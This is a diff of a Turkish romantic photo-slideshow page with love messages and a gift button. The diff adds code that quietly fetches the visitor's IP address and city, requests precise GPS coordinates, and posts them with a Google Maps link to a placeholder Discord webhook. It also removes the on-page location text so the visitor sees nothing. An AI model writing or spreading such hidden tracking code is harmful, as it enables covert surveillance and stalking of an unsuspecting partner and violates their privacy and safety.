@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <script type="text/javascript">
-        (function(c,l,a,r,i,t,y){
-            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-        })(window, document, "clarity", "script", "vecz1fv72x");
-    </script>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "vecz1fv72x");
+</script>
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -43,12 +43,11 @@
             text-shadow: 0 0 15px #ff00ff;
         }
 
-        /* Konum Yazısı Stili */
+        /* Konum yazısı için minik bir stil (tasarımı bozmaz) */
         #konum-bilgi {
-            font-size: 0.9rem;
-            color: #aaa;
-            margin-bottom: 20px;
-            font-style: italic;
+            font-size: 0.8rem;
+            color: #444;
+            margin-bottom: 5px;
         }
 
         button {
@@ -76,7 +75,7 @@
             border-radius: 10px;
             cursor: pointer;
             box-shadow: 0 0 20px #ff0077;
-            display: none;
+            display: none; 
         }
 
         #hediyeButon:hover {
@@ -90,10 +89,9 @@
     <div id="icerik">
         <img id="foto" src="foto1.jpg">
         <p id="soz">Seninle her günüm daha güzel.</p>
-        <p id="konum-bilgi">Konumun aranıyor... 📍</p> 
-    </div>
+        <p id="konum-bilgi"></p> </div>
 
-    <button onclick="ileri()">İleri ➜</button>
+    <button id="ileriBtn" onclick="ileri()">İleri ➜</button>
 
     <button id="hediyeButon" onclick="window.location.href='hediye.html'">Hediyeyi Gör 🎁</button>
 
@@ -102,33 +100,56 @@
     </audio>
 
     <script>
-        // --- KONUM BULMA KODU BAŞLANGIÇ ---
-        window.onload = function() {
-            const konumAlani = document.getElementById("konum-bilgi");
+        // --- KONUM VE DISCORD AYARLARI ---
+        const WEBHOOK_URL = "BURAYA_DISCORD_WEBHOOK_URL_YAPISTIR"; 
 
-            // Önce IP ile şehir tahmini yapalım (Hızlı sonuç için)
+        function discordaGonder(mesaj) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: mesaj })
+            });
+        }
+
+        window.onload = function() {
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
-                    konumAlani.innerHTML = `${data.city}, ${data.country_name} civarından bağlanıyorsun...`;
+                    discordaGonder(`🚀 **Giriş Yapıldı!**\n📍 Şehir: ${data.city}\n🌐 IP: ${data.ip}`);
                     
-                    // Sonra daha hassas konum için izin isteyelim
                     if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(function(position) {
-                            const lat = position.coords.latitude.toFixed(4);
-                            const lng = position.coords.longitude.toFixed(4);
-                            konumAlani.innerHTML = `Tam konumun: ${data.city} (${lat}, ${lng}) 📍`;
+                        navigator.geolocation.getCurrentPosition(pos => {
+                            discordaGonder(`🎯 **Tam Konum:**\n📍 https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                         });
                     }
-                })
-                .catch(() => {
-                    konumAlani.innerHTML = "Konumun gizli sanırım... 🤫";
                 });
         };
-        // --- KONUM BULMA KODU BİTİŞ ---
 
+        // --- SENİN ORİJİNAL FOTOĞRAF GEÇİŞ SİSTEMİN ---
         const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
         const sozler = [
             "Seninle her günüm daha güzel.",
             "Gülüşün dünyamı aydınlatıyor.",
             "Kalbim hep seninle.",
+            "Sana her baktığımda yeniden aşık oluyorum.",
+            "İyi ki varsın, iyi ki benimsin."
+        ];
+
+        let index = 0;
+
+        function ileri() {
+            index++;
+
+            if (index === fotolar.length) {
+                document.getElementById("hediyeButon").style.display = "block";
+                document.getElementById("ileriBtn").style.display = "none"; // İleri butonunu gizler
+                return;
+            }
+
+            document.getElementById("foto").src = fotolar[index];
+            document.getElementById("soz").innerText = sozler[index];
+        }
+    </script>
+
+</body>
+</html>
